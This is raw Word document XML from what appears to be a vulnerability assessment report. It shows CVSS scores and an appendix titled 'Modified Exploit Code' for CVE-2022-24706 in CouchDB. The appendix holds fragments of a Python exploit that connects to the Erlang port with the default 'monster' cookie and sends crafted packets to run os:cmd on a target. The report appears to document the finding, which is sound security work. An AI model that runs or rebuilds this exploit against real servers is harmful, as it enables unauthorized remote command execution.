    </w:p>
    <w:p w:rsidR="008B0AC9" w:rsidRPr="002848E4" w:rsidRDefault="007A53C5" w:rsidP="008B0AC9">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId23" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="008B0AC9" w:rsidRPr="002848E4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:color w:val="4F81BD" w:themeColor="accent1"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:X/CR:M/IR:M/AR:L/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="008B0AC9" w:rsidRDefault="008B0AC9" w:rsidP="008B0AC9">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008B0AC9" w:rsidRPr="002848E4" w:rsidRDefault="008B0AC9" w:rsidP="008B0AC9">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Adjusted Scores:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008B0AC9" w:rsidRPr="002848E4" w:rsidRDefault="008B0AC9" w:rsidP="008B0AC9">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">CVSS Base Score: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008B0AC9" w:rsidRPr="002848E4" w:rsidRDefault="008B0AC9" w:rsidP="008B0AC9">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Impact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5.9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008B0AC9" w:rsidRPr="002848E4" w:rsidRDefault="008B0AC9" w:rsidP="008B0AC9">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Exploitability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3.9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008B0AC9" w:rsidRPr="002848E4" w:rsidRDefault="008B0AC9" w:rsidP="008B0AC9">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">CVSS Temporal Score: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008B0AC9" w:rsidRPr="002848E4" w:rsidRDefault="008B0AC9" w:rsidP="008B0AC9">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CVSS Environmental Score: 8.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008B0AC9" w:rsidRPr="002848E4" w:rsidRDefault="008B0AC9" w:rsidP="008B0AC9">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Modified Impact </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Subscore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: 5.5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008B0AC9" w:rsidRDefault="008B0AC9" w:rsidP="008B0AC9">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Overall CVSS Score: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>8.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008B0AC9" w:rsidRDefault="008B0AC9" w:rsidP="008B0AC9">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008B0AC9" w:rsidRPr="002848E4" w:rsidRDefault="008B0AC9" w:rsidP="008B0AC9">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Risk Rating: High</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial Black" w:eastAsia="Arial Black" w:hAnsi="Arial Black" w:cs="Arial Black"/>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B6308" w:rsidRDefault="008979F6" w:rsidP="003B6308">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc143392749"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Appendix B: </w:t>
      </w:r>
      <w:r w:rsidR="00BC6CA5">
        <w:t>Modified Exploit Code</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRDefault="008979F6" w:rsidP="003B6308">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc143392750"/>
      <w:r>
        <w:t xml:space="preserve">Modified Exploit Code </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>For</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003B6308" w:rsidRPr="003B6308">
        <w:t>CVE-2022-24706</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w:rsidR="003B6308" w:rsidRDefault="003B6308" w:rsidP="003B6308">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003B6308" w:rsidRPr="003B6308" w:rsidRDefault="003B6308" w:rsidP="003B6308">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>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import socket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from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hashlib</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> import md5</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import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>struct</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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import sys</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import re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import time</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TARGET = ""</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EPMD_PORT = 4369 # Default </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Erlang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> distributed port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COOKIE = "monster" # Default </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Erlang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookie for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </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ERLNAG_PORT = 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EPM_NAME_CMD = b"\x00\x01\x6e" # Request for nodes list</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Some data:</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NAME_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MSG  =</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> b"\x00\x15n\x00\x07\x00\x03\x49\x9cAAAAAA@AAAAAAA"</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CHALLENGE_REPLY = b"\x00\x15r\x01\x02\x03\x04"</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CTRL_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DATA  =</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> b"\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03"</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CTRL_DATA += b"\x00\x00\x00\x00\x00w\x00w\x03rex"</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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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compile_cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(CMD):</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MSG  =</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> b"\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00"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MSG += b"\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k"</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MSG += </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>struct.pack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">("&gt;H", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(CMD))</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MSG += </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bytes(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CMD, '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ascii</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MSG += </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>b'jw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>\x04user'</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PAYLOAD = b'\x70' + CTRL_DATA + MSG</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PAYLOAD = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>struct.pack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">('!I', </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(PAYLOAD)) + PAYLOAD</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return PAYLOAD</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 xml:space="preserve">"Remote Command Execution via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Erlang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Distribution Protocol.\n")</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while not TARGET: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TARGET = </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>input(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"Enter target host:\n&gt; ")</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Connect to EPMD:</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lastRenderedPageBreak/>
        <w:t>try:</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epm_socket</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>socket.socket</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>socket.AF_INET</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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socket.SOCK</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>_STREAM</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epm_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>socket.connect</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>((TARGET, EPMD_PORT))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except </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>socket.error</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>msg</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Couldnt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
